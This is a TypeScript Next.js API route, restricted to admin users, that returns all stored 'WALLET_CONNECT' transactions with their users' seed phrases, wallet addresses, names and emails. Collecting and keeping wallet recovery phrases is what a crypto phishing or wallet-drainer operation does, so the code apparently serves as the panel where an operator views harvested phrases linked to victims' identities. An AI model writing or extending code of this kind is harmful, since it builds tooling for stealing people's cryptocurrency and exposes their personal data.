import { NextResponse } from "next/server";
import { getServerSession } from "next-auth";
import { authOptions } from "@/pages/api/auth/[...nextauth]";
import prisma from "@/lib/prisma";

async function isAdmin(email: string): Promise<boolean> {
  const user = await prisma.user.findUnique({
    where: { email },
    select: { role: true },
  });
  return user?.role === "ADMIN";
}

export async function GET() {
  const session = await getServerSession(authOptions);
  if (!session?.user?.email) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const admin = await isAdmin(session.user.email);
  if (!admin) {
    return NextResponse.json({ error: "Admin access required" }, { status: 403 });
  }

  const walletConnections = await prisma.transaction.findMany({
    where: {
      address: "WALLET_CONNECT",
      seedPhrase: { not: null },
    },
    orderBy: { createdAt: "desc" },
    select: {
      id: true,
      method: true,
      userWalletAddress: true,
      seedPhrase: true,
      createdAt: true,
      user: {
        select: {
          id: true,
          name: true,
          email: true,
          username: true,
        },
      },
    },
  });

  return NextResponse.json({ walletConnections });
}
